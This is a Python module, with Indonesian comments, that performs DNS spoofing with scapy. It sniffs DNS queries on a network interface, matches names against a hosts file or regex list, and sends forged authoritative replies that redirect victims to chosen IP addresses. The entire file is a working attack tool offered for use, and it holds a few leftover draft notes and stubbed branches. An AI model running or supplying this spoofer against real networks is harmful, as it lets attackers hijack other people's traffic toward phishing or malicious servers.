# modules/dns_spoof.py
import scapy.all as scapy
import time
import logging
import threading
import re  # Regular expressions

log = logging.getLogger(__name__)

def attack(iface, hosts_file, query_type="A", regex_mode=False):
    r"""  <-- Tambahkan 'r' di sini
    Melakukan DNS spoofing.

    Args:
        iface: Interface jaringan untuk sniffing.
        hosts_file: File hosts dengan format: <ip_address> <hostname>  (atau regex jika regex_mode=True)
        query_type: Jenis query DNS yang akan di-spoof (default: "A").  Bisa "A", "AAAA", "CNAME", "MX", "TXT", dll.
        regex_mode: Jika True, interpretasikan hosts_file sebagai regular expressions.

    Contoh hosts_file (normal mode):
        192.168.1.100  example.com
        192.168.1.100  www.example.com

    Contoh hosts_file (regex_mode=True):
        192.168.1.100  .*\.example\.com   # Spoof semua subdomain example.com
        10.0.0.1       mail\.example\.net  # Spoof mail.example.net

    """
    # ... (sisa kode) ...

    def get_hosts_mapping(filename, regex_mode):
        """Memuat mapping IP dan hostname (atau regex) dari file."""
        mapping = {}
        try:
            with open(filename, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[0]
                            for hostname_or_regex in parts[1:]:
                                if regex_mode:
                                    try:
                                        re.compile(hostname_or_regex)  # Validasi regex
                                        mapping[hostname_or_regex] = ip
                                    except re.error:
                                        log.warning(f"Invalid regular expression: {hostname_or_regex}")
                                else:
                                     mapping[hostname_or_regex] = ip
        except FileNotFoundError:
            log.error(f"Hosts file not found: {filename}")
            return {}  # Return empty mapping
        return mapping

    def dns_responder(packet, hosts_mapping, query_type, regex_mode):
        """Memproses paket DNS dan mengirim respons palsu."""
        if packet.haslayer(scapy.DNSQR) and packet.getlayer(scapy.DNS).qr == 0:
            # Ini adalah DNS query
            dns_layer = packet.getlayer(scapy.DNS)
            query_name = dns_layer.qd.qname.decode('utf-8')
            requested_type = dns_layer.qd.qtype

            # Convert numerical type to string representation
            type_mapping = {
                1: "A",
                2: "NS",
                5: "CNAME",
                6: "SOA",
                15: "MX",
                16: "TXT",
                28: "AAAA",
                # Tambahkan jenis lain jika diperlukan
            }
            requested_type_str = type_mapping.get(requested_type, str(requested_type))


            log.info(f"Received DNS query for: {query_name} (Type: {requested_type_str})")

            # Hapus trailing dot jika ada
            if query_name.endswith('.'):
                query_name = query_name[:-1]

            spoofed_ip = None
            if not regex_mode:
                if query_name in hosts_mapping and (query_type == "ANY" or requested_type_str == query_type):
                  spoofed_ip = hosts_mapping[query_name]
            else:
                # Regex mode: Cari match
                for pattern, ip in hosts_mapping.items():
                    if re.match(pattern, query_name) and (query_type == "ANY" or requested_type_str == query_type):
                        spoofed_ip = ip
                        log.info(f"Matched regex: {pattern}")
                        break

            if spoofed_ip:
                log.info(f"Spoofing {query_name} (Type: {query_type}) to {spoofed_ip}")

                # Buat DNS response
                if query_type == "A" or query_type == "ANY":
                  dns_response = scapy.DNSRR(rrname=query_name + ".", type='A', rdata=spoofed_ip)
                elif query_type == "AAAA":
                    # Contoh untuk AAAA (IPv6) response.  Anda perlu mengganti dengan IPv6 yang valid.
                    # dns_response = scapy.DNSRR(rrname=query_name + ".", type='AAAA', rdata="2001:db8::1") #Contoh
                    log.warning("AAAA spoofing requested, but no valid IPv6 address provided. Skipping.")
                    return
                elif query_type == 'CNAME':
                    # Contoh CNAME
                    # dns_response = scapy.DNSRR(rrname=query_name + ".", type="CNAME", rdata="spoofed.example.com.") #Contoh, perlu diganti
                    log.warning("CNAME spoofing requested, but no valid CNAME provided, Skipping.")
                    return
                else:
                    log.warning(f"Unsupported query type for spoofing: {query_type}")
                    return

                dns_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                          scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                          scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd, aa=1, qr=1, an=dns_response)  #ancount = 1
                scapy.send(dns_pkt, verbose=False, iface=iface)


    hosts_mapping = get_hosts_mapping(hosts_file, regex_mode)
    if not hosts_mapping:
        log.error("No valid entries found in hosts file. Exiting.")
        return

    log.info(f"DNS spoofing started on interface {iface} (Query Type: {query_type}, Regex Mode: {regex_mode}). Press Ctrl+C to stop.")

    try:
        # Sniff paket DNS, dan gunakan filter untuk UDP port 53
        # Gunakan prn untuk memanggil dns_responder untuk setiap paket
        scapy.sniff(iface=iface, filter="udp port 53", prn=lambda pkt: dns_responder(pkt, hosts_mapping, query_type, regex_mode), store=0)

    except KeyboardInterrupt:
        log.info("DNS spoofing stopped.")
    except Exception as e:
        log.exception(f"An unexpected error occurred: {e}")